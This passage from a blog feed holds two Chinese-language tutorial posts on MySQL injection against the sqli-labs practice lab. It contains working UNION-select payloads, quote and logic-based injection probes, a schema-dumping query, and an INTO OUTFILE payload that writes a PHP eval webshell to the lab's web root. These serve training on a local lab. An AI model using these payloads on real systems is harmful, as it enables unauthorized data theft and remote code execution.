<p>union select 测试回显字段是多少</p>
<pre><code class="language-php+HTML">http://192.168.31.128/sqli-labs/Less-1/?id=-1' union select 1,2,3--+
</code></pre>
</li>
</ul>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1603850451054.png" alt="" loading="lazy"></figure>
<p>可以看出回显到前端的字段是2和3。</p>
<p>因为是练习Getshell，就不进行后续的数据爆破。为了Getshell，需要先收集目标相关的信息，通过上面的报错我们了解到目标数据库为Mysql，下面利用Mysql的一些系统函数来收集一些信息：</p>
<pre><code class="language-php+HTML">http://192.168.31.128/sqli-labs/Less-1/?id=-1' union select 1,concat_ws(',',user(),@@version_compile_os),3--+
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://zzggtt.github.io/post-images/1603850456910.png" alt="" loading="lazy"></figure>
<p>得到信息如下：</p>
<ul>
<li>数据库连接用户：root （权限够了）</li>
<li>操作系统：Windows</li>
</ul>
<p>目前为止，还差网站的绝对路径，可以通过报错，phpinfo界面，404界面等一些方式去搜集。</p>
<p>这里用burpsuite扫一下目录，发现了phpinfo：</p>
<figure data-type="image" tabindex="12"><img src="https://zzggtt.github.io/post-images/1603850462487.png" alt="" loading="lazy"></figure>
<p>然后打开就能收集到网站绝对路径了：</p>
<p><img src="https://zzggtt.github.io/post-images/1603850466908.png" alt="" loading="lazy"><br>
至此Getshell所需的信息基本搜集的差不多了。</p>
<p>Getshell：</p>
<pre><code class="language-php+HTML">http://192.168.31.128/sqli-labs/Less-1/?id=1' union select 1,&quot;&lt;?php @eval($_POST['passwd']);?&gt;&quot;,3 into outfile 'G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php'--+
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://zzggtt.github.io/post-images/1603850471556.png" alt="" loading="lazy"></figure>
<p>使用Webshell管理工具连接：</p>
<figure data-type="image" tabindex="14"><img src="https://zzggtt.github.io/post-images/1603850475512.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="15"><img src="https://zzggtt.github.io/post-images/1603850478921.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Mysql手工注入检测和基础函数]]></title>
        <id>https://zzggtt.github.io/post/mysql-shou-gong-zhu-ru-jian-ce-he-ji-chu-han-shu/</id>
        <link href="https://zzggtt.github.io/post/mysql-shou-gong-zhu-ru-jian-ce-he-ji-chu-han-shu/">
        </link>
        <updated>2020-10-28T01:00:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="注入检测">注入检测</h2>
<h3 id="一-mysql基础">一、Mysql基础</h3>
<p>Mysql的逻辑架构图：</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603847821786.png" alt="" loading="lazy"></figure>
<p>下面的内容采用如下源码进行分析：</p>
<pre><code class="language-php">//源码（sqli-labs）:
$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
</code></pre>
<pre><code class="language-mysql">//对应的sql语句 :
SELECT * FROM users WHERE id='1'' LIMIT 0,1
</code></pre>
<ul>
<li>
<p><strong>分析器</strong></p>
<blockquote>
<p>MySQL的<code>分析器</code>从输入的&quot;select&quot;这个关键字识别出来，这是一个查询语句。它也要把字符串“T”识别成“表名T”，把字符串“ID”识别成“列ID”。做完了这些识别以后，就要做“语法分析”。根据词法分析的结果，语法分析器会根据语法规则，判断你输入的这个SQL语句是否满足MySQL语法。如果你的语句不对，就会收到“You have an error in your SQL syntax”的错误提醒。</p>
</blockquote>
<p>举个例子：比如下面这个语句select少打了开头的字母“s”</p>
</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603847829863.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>执行器</strong></p>
<blockquote>
<p>MySQL通过分析器知道了你要做什么，通过优化器知道了该怎么做，于是就进入了<code>执行器</code>阶段，开始执行语句。</p>
</blockquote>
</li>
<li>
<p><strong>Mysql 逻辑与或运算</strong></p>
<blockquote>
<p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p>
<p>参考：https://www.runoob.com/mysql/mysql-operator.html</p>
<p>我自己的理解：</p>
<ul>
<li>AND：一假即假</li>
<li>OR：一真即真</li>
</ul>
</blockquote>
<p>自己多实践一些例子就能理解：</p>
<p>user表结构：</p>
</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603847836492.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1603847842382.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1603847849079.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1603847853628.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1603847858045.png" alt="" loading="lazy"></figure>
<h3 id="二-触发mysql语法错误-检测注入">二、触发mysql语法错误 检测注入</h3>
<p>常见的通过触发语法错误来检测注入的方式（是否成对匹配）：</p>
<table>
<thead>
<tr>
<th>'</th>
<th>False</th>
</tr>
</thead>
<tbody>
<tr>
<td>''</td>
<td>True</td>
</tr>
<tr>
<td>&quot;</td>
<td>False</td>
</tr>
<tr>
<td>&quot;&quot;</td>
<td>True</td>
</tr>
<tr>
<td>\</td>
<td>False</td>
</tr>
<tr>
<td>\</td>
<td>True</td>
</tr>
</tbody>
</table>
<pre><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=1'
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1603848340972.png" alt="" loading="lazy"></figure>
<pre><code class="language-my">http://127.0.0.1/sqli-labs/Less-1/?id=1\
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1603848346568.png" alt="" loading="lazy"></figure>
<pre><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1603848351890.png" alt="" loading="lazy"></figure>
<h3 id="三-通过逻辑运算-检测注入">三、通过逻辑运算 检测注入</h3>
<p>以如下SQL语句为例：</p>
<pre><code class="language-mysql">SELECT * FROM users WHERE id = 1;
</code></pre>
<table>
<thead>
<tr>
<th>AND 1</th>
<th>True</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND 0</td>
<td>False</td>
</tr>
<tr>
<td>id=3-1</td>
<td>返回2的数据即为True</td>
</tr>
<tr>
<td>id=1*3</td>
<td>返回3的数据即为True</td>
</tr>
</tbody>
</table>
<figure data-type="image" tabindex="11"><img src="https://zzggtt.github.io/post-images/1603848358428.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://zzggtt.github.io/post-images/1603848362778.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://zzggtt.github.io/post-images/1603848366369.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://zzggtt.github.io/post-images/1603848371231.png" alt="" loading="lazy"></figure>
<h2 id="基础函数">基础函数</h2>
<h3 id="mysql常用系统函数">Mysql常用系统函数</h3>
<blockquote>
<p>version()            #MySQL版本<br>
user()               #数据库用户名<br>
database()           #数据库名<br>
@@datadir            #数据库路径<br>
@@version_compile_os #操作系统版本</p>
</blockquote>
<figure data-type="image" tabindex="15"><img src="https://zzggtt.github.io/post-images/1603848377306.png" alt="" loading="lazy"></figure>
<h3 id="mysql连接函数">Mysql连接函数</h3>
<blockquote>
<p>函数具体介绍以及使用，参考：https://www.cnblogs.com/lcamry/p/5715634.html</p>
</blockquote>
<p>当我们使用union注入去获取数据库相关数据时，由于union select的特性，获取一条数据时不会又太大影响，例如：</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id='1' UNION SELECT 1,user(),3
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://zzggtt.github.io/post-images/1603848383577.png" alt="" loading="lazy"></figure>
<p>但是想要获取多条数据时，例如：</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id='1' UNION SELECT 1,schema_name,3 FROM information_schema.SCHEMATA
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://zzggtt.github.io/post-images/1603848390763.png" alt="" loading="lazy"></figure>
<p>以sqli-labs靶场源码为例，通常服务端是这样写的：</p>
<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
$result=mysqli_query($con1, $sql);
</code></pre>
<p>结果就是这样的：</p>
<figure data-type="image" tabindex="18"><img src="https://zzggtt.github.io/post-images/1603848396222.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="19"><img src="https://zzggtt.github.io/post-images/1603848400663.png" alt="" loading="lazy"></figure>
<p>就只能爆出LIMIT 0,1 的数据。</p>
<p>所以通过使用连接函数来爆破多条数据：</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id='-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.SCHEMATA LIMIT 0,1
</code></pre>
<figure data-type="image" tabindex="20"><img src="https://zzggtt.github.io/post-images/1603848406039.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://zzggtt.github.io/post-images/1603848410717.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
</feed>